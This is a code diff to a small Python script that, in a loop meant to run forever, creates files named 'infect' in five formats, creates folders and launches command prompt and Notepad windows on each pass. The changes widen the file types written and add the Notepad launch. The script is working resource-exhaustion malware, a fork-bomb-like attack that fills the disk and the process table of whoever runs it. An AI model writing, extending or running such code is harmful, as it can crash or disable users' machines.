@@ -7,21 +7,28 @@ while (i>0):
 
    #create infinite files
    file = open(f"infect{i}.txt", "w")
-   file.write("Infected Succesfully")
+   file1 = open(f"infect{i}.docx", "w")
+   file2 = open(f"infect{i}.py", "w")
+   file3 = open(f"infect{i}.html", "w")
+   file4 = open(f"infect{i}.xml", "w")
+   file.write("Infected Successfully")
+   file1.write("Infected Successfully")
+   file2.write("Infected Successfully")
+   file3.write("Infected Successfully")
+   file4.write("Infected Successfully")
    file.close()
+   file1.close()
+   file2.close()
+   file3.close()
+   file4.close()
    try:
-
     #create infinite folders
-    os.mkdir('folder{}'.format(str(i)))
-
-
+    os.mkdir('infect{}'.format(str(i)))
+    
    except:
        pass
 
    #open cmd infinite times
    os.system('start cmd')
+   os.system('start notepad')
    i = i + 1
-
-
-
-
